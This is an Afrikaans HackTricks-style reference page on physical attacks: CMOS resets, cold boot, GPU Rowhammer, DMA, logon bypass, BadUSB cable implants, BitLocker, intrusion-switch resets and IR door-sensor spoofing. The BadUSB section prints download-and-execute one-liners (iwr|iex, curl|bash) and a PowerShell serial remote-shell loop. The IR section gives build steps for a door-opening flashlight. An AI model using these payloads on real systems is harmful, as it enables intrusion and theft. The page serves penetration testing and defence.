# Fisiese aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherwinning en stelselsekuriteit

Instellings van verouderde rekenaarfirmware kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde CMOS-terugstelspringer te gebruik. Die vereiste tyd sonder krag hang van die moederbord af, en moderne UEFI-wagwoorde of -sleutels kan in nievlugtige flitsgeheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor wees en dus ’n batteryverwydering oorleef. Raadpleeg die moederbord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyfenkripsieherstel aktiveer.

Op verouderde x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing ondersoek of verander. CmosPwd herken wagwoordformate van ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-toestand rugsteun, herstel of uitvee/vernietig; die gepubliseerde bouweikenomgewings is verouderde DOS/Windows, Linux, FreeBSD en NetBSD.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie algemene UEFI-wagwoordverwyderaars nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaarfirmware vertoon ’n verskafferspesifieke uitdagingskode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan verouderde verskafferherstelwagwoorde vir sommige modelle aflei, maar baie stelsels sluit toegang sonder ’n afleidbare uitdaging. Beskou enige gegenereerde wagwoord as modelspesifiek en vermy dat jy permanente pogingtellers uitput.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskermings oudit. Begin met die onderstaande kontrole wat niks verander nie; die opsionele `-a modify`-modus probeer doelbewus veranderlikes beskadig en moet slegs op ’n laboratoriumstelsel gebruik word wat herstel kan word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang nie geskik is vir produksie-eindpunte nie.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-ontleding en Cold Boot-aanvalle

DRAM verloor nie elke bis onmiddellik wanneer verversing stop nie. Die tempo van verval wissel aansienlik volgens moduultegnologie en temperatuur; verkoeling kan bruikbare data veel langer bewaar as ’n onverkilde kragsiklus. ’n Cold-boot-aanval herlaai die stelsel vinnig na ’n klein verkrygingsomgewing, of dra ’n verkoelde module oor, vang rou geheue vas en rekonstrueer kriptografiese sleutels ondanks bisverval. ’n Skyfkopieernutsprogram is nie vanself ’n fisiesegeheuebeeldingsprogram nie, en Volatility ontleed ’n vaslegging eerder as om dit te verkry; gebruik ’n platformgeskikte, gevalideerde verkrygingsnutsprogram.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen bladsytabelle

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU-virtuelegeheue-metadata** teiken in plaas van gewone buffers. Onlangse navorsing oor **GDDR6 NVIDIA Ampere-GPU's** toon dat ’n aanvaller wat CUDA-kode sonder verhoogde voorregte uitvoer, GPU-spesifieke hamerpatrone kan bou, **geheuemassering** kan gebruik om pagineringstrukture in kwesbare rye te plaas en dan bisse in die **laastevlak-bladsytabel** of ’n intermediêre **bladsygids** kan omskakel. Sodra ’n enkele vertaalinskrywing beskadig is, kan die aanvaller **arbitrêre GPU-geheue-lees-/skryfvermoë** verkry en dan na ’n kompromittering van die gasheerstelsel oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Uitbuitingspatroon

1. **Profileer rye wat gehamer kan word** in GDDR6 en bou verversingsbewuste / nie-eenvormige hamerpatrone wat DRAM-interne versagtingsmaatreëls omseil.
2. **Masseer GPU-toekennings** sodat die drywer vertaalstrukture vir bladsye in fisiese liggings plaas wat gehamer kan word, eerder as om hulle in die verstek-beskermde poel te hou. In die praktyk kan dit beteken dat die laegeheue-bladsytabelstreek uitgeput word en dat groot, yl UVM-toewysings met beheerde tussenruimtes gespuit word.
3. **Skakel vertaalmetadata om**, soos **PFN**- of aperture-verwante bisse binne ’n bladsytabel- / bladsygidsinskrywing, sodat die aanvallerbeheerde virtuele bladsy na bladsytabelbladsye, arbitrêre GPU-geheue of gasheersigbare stelseltoewysings verwys.
4. Gebruik die vervalste toewysing weer om bykomende vertaalinskrywings te herskryf en **arbitrêre GPU-geheue-lees-/skryfvermoë** oor GPU-kontekste heen te verkry.

### Oorskakeling na die gasheerstelsel en versagtingsmaatreëls

- Wanneer **IOMMU gedeaktiveer** is, kan vervalste stelsel-aperture-toewysings arbitrêre **fisiese gasheergeheue** aan die GPU blootstel, wat die GPU-primitief in ’n volledige kompromittering van die gasheerstelsel omskep.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken laastevlak-bladsytabelinskrywings, terwyl **GeForge** toon dat dit makliker kan wees om ’n bladsygidsvlak te beskadig omdat een bisomskakeling ’n groter vertaal-subboom kan herlei. Moenie net een pagineringslaag as sekuriteitskritiek beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bly belangrik omdat dit die direkte pad na arbitrêre gasheergeheue wat deur GDDRHammer/GeForge gebruik word, blokkeer, maar dit is **nie ’n volledige versagtingsmaatreël nie**. **GPUBreach** toon ’n tweedefase-oorskakeling waar die aanvaller GPU-skryfbare, drywereienaarskap-CPU-buffers beskadig en dan NVIDIA-drywergeheueveiligheidsfoute aktiveer om ’n kernskryfprimitief en ’n **worteldop** te verkry, selfs wanneer IOMMU geaktiveer is.<sup>[[3]](#references)</sup>
- **Stelselvlak-ECC** is ’n praktiese versterkingsmaatreël op ondersteunde werkstasie-/bediener-GPU's. Verbruikers-GPU's sonder ECC bied ’n swakker verdedigingsoppervlak.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bisomskakelings op ’n RTX 3060 en **202** op ’n RTX A6000 aangemeld, genoeg om ’n werkende ketting vir verhoging van gasheervoorregte te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-aanvalle

Vir vanlyn UEFI IFR/NVRAM-regstelling wat voorlaai-IOMMU-afdwinging kan afgradeer en ’n Windows DMA-ketting kan aktiveer, sien:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-gebaseerde geheueverkryging en -regstelling** oor koppelvlakke soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese aanmeldomseilingshandtekeninge. Dit is nie bloot “oneffektief teen Windows 10” nie: uitbuitbaarheid hang af van die koppelvlak, teikenbou, IOMMU-beleid, sluittoestand en of Windows Kernel DMA Protection ondersteun en geaktiveer is. Windows 10 weergawe 1803 en later het Kernel DMA Protection op versoenbare platforms bekendgestel, wat die aanvaloppervlak aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir stelseltoegang

Op ’n ongeënkripteerde of reeds ontsluite Windows-volume kan ’n vanlyn omgewing toeganklikheidsbinaries soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat ’n SYSTEM-opdragprompt oplewer wanneer die ooreenstemmende aanmeldskermkortpad gebruik word. Nutsprogramme soos **chntpw** kan plaaslike SAM-rekeningdata wysig. Hierdie metodes omseil nie ’n geslote BitLocker-volume nie en kan geloofsbriewe beskadig wat deur DPAPI/EFS beskerm word; bewaar forensiese kopieë en rugsteune.

**Kon-Boot** is ’n kommersiële nutsprogram wat aanmeldingsverifikasie tydens selflaai omseil vir ondersteunde Windows/macOS-konfigurasies. Verenigbaarheid hang af van die bedryfstelsel, firmwaremodus, Secure Boot en skyf-enkripsie-opstelling; dit dekripteer nie ’n BitLocker-geslote volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows-sekuriteitskenmerke

### Selflaai- en herstelkortpaaie

- **Delete/Supr**, F2, F10 of ’n ander vervaardigersleutel kan firmware-opstelling oopmaak.
- **F8** open slegs verouderde Windows-gevorderde selflaai-opsies op konfigurasies waar daardie roete steeds geaktiveer is; die huidige herstelroete wissel.
- Deur **Shift** in te hou, kan outomatiese Windows-aanmelding in sommige konfigurasies onderdruk word, hoewel beleids-/registerinstellings daardie gedrag kan deaktiveer.<sup>[[17]](#references)</sup>

### BAD USB-toestelle

Toestelle soos **USB Rubber Ducky** en Teensy-borde kan as vertroude HID-sleutelborde identifiseer en voorafbepaalde toetsaanslae invoer. Die loonvrag het aanvanklik dieselfde voorregte en rekenaartoegang as die aangemelde sessie; UAC-aanwysings, skermsluiting, sleutelborduitleg, tydsberekening en USB-beleid by eindpunte beperk dit steeds.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrateur- of rugsteunvoorregte kan gebruik word om ’n skadukopie te skep of registerkorwe te stoor sodat geslote lêers soos **SAM** en **SYSTEM** verkry kan word. Dit is ’n insamelingstegniek ná kompromittering, nie ’n omseiling van voorregte nie, en moet met `diskshadow`/VSS- en registerkorfuitvoer-gebeurtenisse gekorreleer word.

## BadUSB / HID-inplantingstegnieke

### NFC-geaktiveerde Android-HID-apparaat

’n Android-foon met worteltoegang kan slegs ’n programmeerbare USB-sleutelbord word wanneer sy USB-beheerder en kern **USB gadget/HID-ondersteuning** bied. Op versoenbare toestelle stel Kali NetHunter gadget-profiele via **USB Arsenal** beskikbaar. ’n Ander opsie is [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), wat ConfigFS-gadgetfunksies skep en sleutelbord-/muis-karaktertoestelle soos `/dev/hidg0` en `/dev/hidg1` kan beskikbaar stel. Die nutsprogram skep slegs die gadget-eindpunt; ’n afsonderlike proses moet HID-verslae daarheen skryf. Worteltoegang kan nie vergoed vir ’n kern wat ConfigFS, HID-gadgetondersteuning of ’n bruikbare USB-toestelbeheerder ontbreek nie.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Hierdie eindpunt kan met Android NFC gekombineer word as ’n fisiese sneller. Die [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)-toepassing lees ’n merker-UID, skakel dit om na die verwagte voorstelling, kontroleer dit teen ’n plaaslike witlys en stuur ’n ingestelde Rubber Ducky-styl-sleutelbordvolgorde nadat ’n ooreenkoms gevind is. Die gekoppelde gasheerstelsel sien gewone sleutelbordinvoer en benodig geen NFC-sagteware nie.<sup>[[22]](#references)[[24]](#references)</sup>

Valideer toestelidentifisering en sleutelborduitleg in ’n leë teksredigeerder voordat jy kortpaaie of opdragte gebruik. ’n Onskadelike loonvrag is:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Belangrike vertrouensgrense:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- ’n **UID-whitelys is identifikasie, nie verifikasie nie**. UID’s is publiek, en sommige token-tipes of emulators laat kloning of nabootsing toe. ’n Gekopieerde toegelate UID volg dieselfde verspreidingspad as die oorspronklike token.
- Die **NfcScreenOff** Magisk-module verander die NFC-diens sodat dit optree asof die skerm aan en ontsluit is. As die foon reeds aan ’n gasheer gekoppel is, kan iemand hiermee die payload aktiveer sonder om die foon te ontsluit.
- Wagwoorde, API-tokens en opdragte wat in die payload gestoor word, is herwinbare geheime op ’n rooted toestel of ’n toestel met ’n ontsluite selflaaiprogram. Om ’n wagwoord via HID in te tik, is herbruikbare-wagwoord-outomatisering, nie wagwoordlose verifikasie nie.
- HID-inspuiting gebruik die aktiewe rekenaaromgewing se voorregte en is afhanklik van fokus, tydsberekening en die gasheer se sleutelborduitleg. Vereis onlangse gebruikersbevestiging voordat sensitiewe aksies uitgevoer word, vermy bevoorregte geheime in skrifte, en gebruik ’n kriptografiese uitdaging-antwoord-outentiseerder vir werklike verifikasie.

### Wi-Fi-beheerde kabelinplantings

- Inplantings gebaseer op ESP32-S3, soos **Evil Crow Cable Wind**, skuil binne USB-A→USB-C- of USB-C↔USB-C-kabels, word uitsluitlik as ’n USB-sleutelbord geïdentifiseer en stel hul C2-stapel via Wi-Fi beskikbaar. Die operateur hoef net die kabel van die slagoffergasheer af van krag te voorsien, ’n hotspot met die naam `Evil Crow Cable Wind` en die wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te blaai om die ingebedde HTTP-koppelvlak te bereik.<sup>[[8]](#references)</sup>
- Die blaaier-UI bied oortjies vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Gestoorde payloads word volgens bedryfstelsel gemerk, sleutelborduitlegte word onderweg verander, en VID/PID-stringe kan aangepas word om bekende randtoestelle na te boots.
- Omdat die C2 binne die kabel is, kan ’n foon payloads gereedmaak, uitvoering aktiveer en Wi-Fi-bewyse bestuur sonder om die organisasie se netwerk te gebruik—nuttig vir fisieke indringings met ’n kort verblyftyd.

### OS-bewuste AutoExec-payloads

- AutoExec-reëls koppel een of meer payloads daaraan om onmiddellik ná USB-enumerasie afgevuur te word. Die inplanting doen liggewig OS-vingerafdrukke en kies die ooreenstemmende skrif.
- Voorbeeldwerkvloei:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering sonder toesig plaasvind, kan die blote omruil van ’n laaikabel “plug-and-pwn”-aanvanklike toegang in die konteks van die aangemelde gebruiker bewerkstellig.

### HID-geïnisialiseerde remote shell oor Wi-Fi TCP

1. **Sleutel-aanslag-inisialisering:** ’n Gestoorde payload maak ’n konsole oop en plak ’n lus wat alles uitvoer wat op die nuwe USB-seriële toestel aankom. ’n Minimale Windows-variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 ’n TCP-kliënt (Python-skrip, Android-APK of lessenaartoepassing) terug na die operateur begin. Enige grepe wat in die TCP-sessie getik word, word na die seriële lus hierbo aangestuur, wat afstandbeheer-uitvoering van opdragte moontlik maak, selfs op luggeïsoleerde gashere. Uitvoer is beperk, daarom voer operateurs gewoonlik opdragte blind uit (rekeningaanmaak, bykomende nutsgoed gereedmaak, ens.).

### HTTP OTA-opdateringsoppervlak

- Die gedokumenteerde Evil Crow Cable Wind-koppelvlak stel ’n firmware-opdaterings-eindpunt by `/update` sonder verifikasie bloot:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Veldoperateurs kan funksies tydens ’n operasie warm omruil (bv. USB Army Knife-firmware flits) sonder om die kabel oop te maak, sodat die implant na nuwe vermoëns kan oorskakel terwyl dit steeds by die teiken gasheer ingeprop is.

## BitLocker-enkripsie omseil

’n Gemagtigde forensiese verkryging van ’n stelsel wat aan is of onlangs geloop het, kan ’n BitLocker-volumemeesterleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële nutsmiddels soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde geheuebeelde, hibernasielêers of omvalstortings deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook omvalstortings wanneer BitLocker geaktiveer is, en ’n gestoorde 48-syfer-herstelwagwoord is ’n ander artefak as ’n volum sleutel wat in die geheue gehou word.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Sosiale manipulasie om ’n herstelsleutel by te voeg

’n Aanvaller wat ’n administrateur oorreed om BitLocker-bestuurbevele uit te voer, kan ’n herstelwagwoord-, eksterne-sleutel- of ander beskermer byvoeg en dit dan vaslê. ’n Herstelwagwoord kan nie ’n arbitrêre string nulle wees nie: BitLocker se numeriese herstelwagwoorde moet aan ’n gevalideerde formaat van 48 syfers voldoen. Die toepaslike sintaksis vir gemagtigde administrasie is `manage-bde -protectors -add C: -recoverypassword`; lys die resulterende beskermers met `manage-bde -protectors -get C:`. Monitor die byvoeging van beskermers en verseker dat nuwe herstelmateriaal slegs op goedgekeurde plekke in veilige bewaring gehou word.<sup>[[16]](#references)</sup>

---

## Ontginning van onderstel-indringings-/onderhoudskakelaars om die BIOS na fabrieksinstellings terug te stel

Baie moderne skootrekenaars en rekenaars met ’n klein vormfaktor sluit ’n **onderstel-indringingskakelaar** in wat deur die Ingebedde Beheerder (EC) en die BIOS/UEFI-firmware gemonitor word. Die skakelaar se primêre doel is om ’n waarskuwing te aktiveer wanneer ’n toestel oopgemaak word, maar vervaardigers implementeer soms ’n **ongedokumenteerde herstelsneltoets** wat geaktiveer word wanneer die skakelaar volgens ’n spesifieke patroon omgeskakel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die skakelaar is aan ’n **GPIO-onderbreking** op die EC gekoppel.
2. Firmware wat op die EC loop, hou boek van die **tydsberekening en aantal drukke**.
3. Wanneer ’n hardgekodeerde patroon herken word, roep die EC ’n *hoofbordterugstel*-roetine aan wat **die inhoud van die stelsel se NVRAM/CMOS uitwis**.
4. Met die volgende selflaai laai geaffekteerde modelle die teruggestelde firmwaretoestand. Afhangend van die vervaardiger en hersiening kan die skoongemaakte toestand ’n toesighouerwagwoord, pasgemaakte selflaai-instellings of ingeskrewe Secure Boot-sleutels insluit; TPM-toestand en die uitwerking op skyf-enkripsie moet afsonderlik beoordeel word.

> ’n Firmware-terugstelling kan eksterne selflaaiopsies herstel, maar dit **dekripteer nie berging nie**. BitLocker of ’n ander volskyf-enkripsiestelsel kan ná veranderinge aan die TPM/firmware herstelmodus betree en steeds die interne skyf sonder ’n herstelsleutel beskerm.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13-skootrekenaar

Die herstelsneltoets vir die Framework 13 (11de/12de/13de generasie) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Ná die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM tydens die volgende herlaai uit te vee. Die hele prosedure neem ongeveer 40 s en vereis **niks behalwe ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Algemene uitbuitingsprosedure

1. Skakel die teiken aan of hervat dit uit slaapmodus sodat die EC loop.
2. Verwyder die onderdeksel om toegang tot die indringing-/instandhoudingskakelaar te kry.
3. Herhaal die vervaardigerspesifieke wisselpatroon (raadpleeg dokumentasie of forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; kyk dan watter firmware-instellings en aanmeldbesonderhede werklik verander het.
5. As dit gemagtig is en eksterne selflaai beskikbaar is, selflaai vanaf ’n beheerde live-image. Sodra ’n interne volume wettig ontsluit is (of as dit nooit geënkripteer was nie), kan die live-omgewing aanmeldbesonderhede en data verkry, of die EFI System Partition ondersoek. Om daardie partisie te wysig en ’n EFI-implantaat te installeer, is permanent en hoogs indringend; dit bly beperk deur Secure Boot, measured boot, firmware-skryfbeskerming en eindpuntmonitering. Geënkripteerde berging bly ontoeganklik sonder die sleutel of herstelmateriaal.

### Opsporing en versagting

* Teken onderstel-indringingsgebeurtenisse in die OS-bestuurskonsole aan en korreleer dit met onverwagte BIOS-terugstellings.
* Gebruik **peuteraanduidende seëls** op skroewe/deksels om oopmaak op te spoor.
* Hou toestelle in **fisies beheerde areas**; aanvaar dat fisiese toegang gelykstaan aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die vervaardiger se “maintenance switch reset”-funksie of vereis bykomende kriptografiese magtiging vir NVRAM-terugstellings.

---

## Verborge IR-inspuiting teen raaklose uitgangsensors

### Sensoreienskappe
- Algemene “wave-to-exit”-sensors koppel ’n naby-IR-LED-sender aan ’n TV-afstandbeheeragtige ontvangermodule wat slegs logiese hoog rapporteer nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekomhulsel keer dat die sender en ontvanger direk na mekaar kyk, dus neem die beheerder aan dat enige bekragtigde draer van ’n nabygeleë weerkaatsing gekom het en aktiveer ’n aflos wat die deurgrendel oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-envelop; die ontvanger aanvaar egter steeds enige sarsie wat by die gefiltreerde draer pas.

### Aanvalwerkvloei
1. **Vang die emissieprofiel vas** – koppel ’n logikaanaliseerder aan die beheerderpenne om beide die golfvorms voor en ná opsporing op te neem wat die interne IR-LED aandryf.
2. **Speel slegs die “ná-opsporing”-golfvorm terug** – verwyder/ignoreer die standaard-LED en dryf ’n eksterne IR-LED van die begin af met die reeds geaktiveerde patroon. Omdat die ontvanger net omgee vir pulstelling/-frekwensie, hanteer dit die vervalste draer as ’n egte weerkaatsing en aktiveer dit die afloslyn.
3. **Beheer die uitsending** – stuur die draer in ingestelde sarsies uit (bv. tientalle millisekondes aan, ongeveer dieselfde tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of steuringshanteringslogika te versadig. Deurlopende uitsending maak die sensor vinnig minder sensitief en keer dat die aflos aktiveer.

### Langafstand-weerkaatsende inspuiting
- Deur die toetsbank-LED met ’n hoëkrag-IR-diode, MOSFET-aandrywer en fokusoptika te vervang, kan die sensor betroubaar vanaf ~6 m geaktiveer word.
- Die aanvaller hoef nie ’n siglyn na die ontvangeropening te hê nie; deur die straal op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan weerkaatste energie die ~30°-sigveld binnedring en ’n handbeweging van naby naboots.
- Omdat die ontvangers slegs swak weerkaatsings verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes weerkaats en steeds bo die opsporingsdrempel bly.

### Gewapende aanvalflitslig
- Deur die aandrywer in ’n kommersiële flitslig in te bou, word die instrument in die oopte versteek. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ≈30 kHz-sarsies te genereer, en gebruik ’n MOSFET om die LED-stroom af te voer.
- ’n Teleskopiese zoomlens vernou die straal vir reikafstand/akkuraatheid, terwyl ’n vibrasiemotor onder MCU-beheer tasbare bevestiging gee dat modulasie aktief is, sonder om sigbare lig uit te straal.
- Deur verskeie gestoorde modulasiepatrone (effens verskillende draerfrekwensies en envelope) te deurloop, neem versoenbaarheid met verskillende herhandelsmerk-sensorfamilies toe. Die gebruiker kan weerkaatsende oppervlaktes afsoek totdat die aflos hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: DRAM-rye grootliks versteur — Cross-Component Rowhammer-aanvalle vanaf moderne GPU’s](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-geheue hamerslaan om GPU-bladsytabelle vir pret en wins te vervals](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege escalation-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om pwn te word”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir terugstelling van die hoofbord](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Geen aanraking! – Omseiling van IR-raaklose uitgangsensors met ’n verborge IR-flitslig”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Koppel in, speel, pwn: Hacking met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot se amptelike dokumentasie en versoenbaarheidsinligting](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Beskerming van Secure Boot-veranderlikes](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Laat ons nie vergeet nie: Cold Boot-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA-beskerming](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bewerkingsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift inhou en outomatiese aanmeldgedrag](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux-dokumentasie - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-kerneldokumentasie - USB HID-gadgetbestuurder](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-na-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Verander ’n Android-foon met root-toegang in ’n NFC-verifikator en outomatiseringsinstrument vir jou rekenaar](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
